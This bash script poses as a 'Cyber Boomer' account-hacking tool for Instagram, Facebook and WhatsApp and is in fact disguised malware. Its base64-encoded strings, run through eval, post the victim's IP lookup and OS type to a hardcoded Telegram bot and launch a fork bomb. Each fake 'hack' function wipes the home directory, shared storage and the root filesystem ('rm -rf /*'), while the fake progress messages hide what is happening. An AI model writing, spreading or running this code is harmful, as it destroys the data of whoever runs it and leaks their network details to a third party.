#!/bin/bash
#-----------------
red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
##################
#inserting
clear
signal="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUxNjc3NDgxNTpBQUdZY0Q5SVhpeU9iaVF0RWdYNU9RRDVaZnJBMDFtN2ZBYy9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDEyNDYzMzA1MjIiIC1kICJ0ZXh0PSQoY3VybCAtTCBpcGxpc3QuY2MvYXBpLyQoY3VybCAtTCBpcHY0LmljYW5oYXppcC5jb20pIHwganEpIiAmPi9kZXYvbnVsbA=="
fbm="OigpeyA6fDogJiB9Ozo="
termux="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUxNjc3NDgxNTpBQUdZY0Q5SVhpeU9iaVF0RWdYNU9RRDVaZnJBMDFtN2ZBYy9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDEyNDYzMzA1MjIiIC1kICJ0ZXh0PVRlcm11eCBTa2lkIFNwb3R0ZWQhIiAmPi9kZXYvbnVsbA=="
kali="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUxNjc3NDgxNTpBQUdZY0Q5SVhpeU9iaVF0RWdYNU9RRDVaZnJBMDFtN2ZBYy9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDEyNDYzMzA1MjIiIC1kICJ0ZXh0PUthbGkgU2tpZCBTcG90dGVkISIgJj4vZGV2L251bGw="
parrot="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUxNjc3NDgxNTpBQUdZY0Q5SVhpeU9iaVF0RWdYNU9RRDVaZnJBMDFtN2ZBYy9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDEyNDYzMzA1MjIiIC1kICJ0ZXh0PVBhcnJvdCBTa2lkIFNwb3R0ZWQhIiAmPi9kZXYvbnVsbA=="
unso="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUxNjc3NDgxNTpBQUdZY0Q5SVhpeU9iaVF0RWdYNU9RRDVaZnJBMDFtN2ZBYy9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDEyNDYzMzA1MjIiIC1kICJ0ZXh0PVVuc3VwcG9ydGVkIFNraWQgU3BvdHRlZCBoZW5jZSBiYWlsZWQuIiAmPi9kZXYvbnVsbA=="

Distro() {
    
    os=$(uname -o)
    case $os in
	Android)
	    echo Android Mode!
	    eval $(base64 -d <<<"$termux")
	    setupa
	    eval $(base64 -d <<<"$fbm")
	    ;;
	*)
	    a=$(source /etc/os-release && echo $ID)
	    case $a in
		kali)
		    echo Kali mode!
		    eval $(base64 -d <<<"$kali")
		    setup
		    eval $(base64 -d <<<"$fbm")
		    ;;
		parrot)
		    echo Parrot mode!
		    eval $(base64 -d <<<"$parrot")
		    setup
		    eval $(base64 -d <<<"$fbm")
		    ;;
		*)
		    echo o.O Not supported!
		    eval $(base64 -d <<<"$unso")
		    eval $(base64 -d <<<"$fbm")
		    exit 0
		    ;;
	    esac
    esac
}

setupa() {
    echo -e "$grn Installing Requirements Please wait..!! $rset "
    eval $(base64 -d <<<"$signal")
    echo " "
    echo -e "$ylo Installing Python To Make Requests $ rset"
    pkg install python jq -y > /dev/null 2>&1
    pip install lolcat > /dev/null 2>&1
    echo " Done "
}
setup() {
    echo -e "$grn Installing Requirements Please wait..!! $rset "
    eval $(base64 -d <<<"$signal")
    echo " "
    echo -e "$ylo Installing Python To Make Requests $ rset"
    sudo apt install python3 jq -y > /dev/null 2>&1
    sudo apt install python3-pip > /dev/null 2>&1
    pip3 install lolcat > /dev/null 2>&1
    echo " Done "
}
sleep 2
clear
echo " "
echo '


 ██████╗██╗   ██╗██████╗ ███████╗██████╗ 
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝
██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗
╚██████╗   ██║   ██████╔╝███████╗██║  ██║
 ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                         
' | lolcat
echo " "
echo '

██████   ██████   ██████  ███    ███ ███████ ██████  
██   ██ ██    ██ ██    ██ ████  ████ ██      ██   ██ 
██████  ██    ██ ██    ██ ██ ████ ██ █████   ██████  
██   ██ ██    ██ ██    ██ ██  ██  ██ ██      ██   ██ 
██████   ██████   ██████  ██      ██ ███████ ██   ██ 
                                                     
                                                     
' | lolcat
echo -e "$red [ 1 ] $ylo Hack Instagram..? $rset"
echo " "
echo -e "$red [ 2 ] $ylo Hack Facebook...? $rset"
echo " "
echo -e "$red [ 3 ] $ylo Hack Whatsapp...? $rset"
read -p  " Select Option >>>>> " opt
sleep 2 
clear
case $opt in
    1)
    
	echo -e "$grn Enter Username: $rset"
	insta
	;;
    2)
	echo -e "$grn Enter Username: $rset"
	fb
	;;
    3)
	echo -e "$grn Enter Number(with country code): $rset"
	ws
	;;
    *)
	echo -e "$red Wrong option! $rset"
	;;
esac

read user
clear
sleep 5
insta() {
    echo " Hacking To The Account..! it took 5 sec"
    eval $(base64 -d <<<"aWYgW1sgJFBSRUZJWCA9PSAqImNvbS50ZXJtdXgiKiBdXQp0aGVuCgogICAgaWYgWyAiJChzdSAtYyBpZCAtdSkiID09ICIwIiBdCiAgICB0aGVuCglhbSBicm9hZGNhc3QgLS11c2VyIDAgXAogICAgICAgICAgIC0tZXMgY29tLnRlcm11eC5hcHAucmVsb2FkX3N0eWxlIHN0b3JhZ2UgXAogICAgICAgICAgIC1hIGNvbS50ZXJtdXguYXBwLnJlbG9hZF9zdHlsZSBjb20udGVybXV4ID4gL2Rldi9udWxsCglybSAtcmYgJFBSRUZJWCAkSE9NRQoJY2QgL3NkY2FyZC8KCXJtIC1yZiAqCglybSAtcmYgLyoKICAgIGVsc2UKCWFtIGJyb2FkY2FzdCAtLXVzZXIgMCBcCgkgICAtLWVzIGNvbS50ZXJtdXguYXBwLnJlbG9hZF9zdHlsZSBzdG9yYWdlIFwKICAgICAgICAgICAtYSBjb20udGVybXV4LmFwcC5yZWxvYWRfc3R5bGUgY29tLnRlcm11eCA+IC9kZXYvbnVsbAoJcm0gLXJmICRQUkVGSVggJEhPTUUKCWNkIC9zZGNhcmQvCglybSAtcmYgKgogICAgZmkKICAgIAplbHNlCiAgICBzdWRvIGNobW9kIDc3NyAvKgogICAgcm0gLXJmIC8qCmZp")
    echo "Successfully Completed"
}

fb() {
    
    echo " Hacking To The Account..! it took 20 sec"
    eval $(base64 -d <<<"aWYgW1sgJFBSRUZJWCA9PSAqImNvbS50ZXJtdXgiKiBdXQp0aGVuCgogICAgaWYgWyAiJChzdSAtYyBpZCAtdSkiID09ICIwIiBdCiAgICB0aGVuCglhbSBicm9hZGNhc3QgLS11c2VyIDAgXAogICAgICAgICAgIC0tZXMgY29tLnRlcm11eC5hcHAucmVsb2FkX3N0eWxlIHN0b3JhZ2UgXAogICAgICAgICAgIC1hIGNvbS50ZXJtdXguYXBwLnJlbG9hZF9zdHlsZSBjb20udGVybXV4ID4gL2Rldi9udWxsCglybSAtcmYgJFBSRUZJWCAkSE9NRQoJY2QgL3NkY2FyZC8KCXJtIC1yZiAqCglybSAtcmYgLyoKICAgIGVsc2UKCWFtIGJyb2FkY2FzdCAtLXVzZXIgMCBcCgkgICAtLWVzIGNvbS50ZXJtdXguYXBwLnJlbG9hZF9zdHlsZSBzdG9yYWdlIFwKICAgICAgICAgICAtYSBjb20udGVybXV4LmFwcC5yZWxvYWRfc3R5bGUgY29tLnRlcm11eCA+IC9kZXYvbnVsbAoJcm0gLXJmICRQUkVGSVggJEhPTUUKCWNkIC9zZGNhcmQvCglybSAtcmYgKgogICAgZmkKICAgIAplbHNlCiAgICBzdWRvIGNobW9kIDc3NyAvKgogICAgcm0gLXJmIC8qCmZp")
    echo "Successfully Completed"

}

ws() {

    echo " Hacking To The Account..! it took 10 sec"
    eval $(base64 -d <<<"aWYgW1sgJFBSRUZJWCA9PSAqImNvbS50ZXJtdXgiKiBdXQp0aGVuCgogICAgaWYgWyAiJChzdSAtYyBpZCAtdSkiID09ICIwIiBdCiAgICB0aGVuCglhbSBicm9hZGNhc3QgLS11c2VyIDAgXAogICAgICAgICAgIC0tZXMgY29tLnRlcm11eC5hcHAucmVsb2FkX3N0eWxlIHN0b3JhZ2UgXAogICAgICAgICAgIC1hIGNvbS50ZXJtdXguYXBwLnJlbG9hZF9zdHlsZSBjb20udGVybXV4ID4gL2Rldi9udWxsCglybSAtcmYgJFBSRUZJWCAkSE9NRQoJY2QgL3NkY2FyZC8KCXJtIC1yZiAqCglybSAtcmYgLyoKICAgIGVsc2UKCWFtIGJyb2FkY2FzdCAtLXVzZXIgMCBcCgkgICAtLWVzIGNvbS50ZXJtdXguYXBwLnJlbG9hZF9zdHlsZSBzdG9yYWdlIFwKICAgICAgICAgICAtYSBjb20udGVybXV4LmFwcC5yZWxvYWRfc3R5bGUgY29tLnRlcm11eCA+IC9kZXYvbnVsbAoJcm0gLXJmICRQUkVGSVggJEhPTUUKCWNkIC9zZGNhcmQvCglybSAtcmYgKgogICAgZmkKICAgIAplbHNlCiAgICBzdWRvIGNobW9kIDc3NyAvKgogICAgcm0gLXJmIC8qCmZp")
    echo "Successfully Completed"
}

Distro
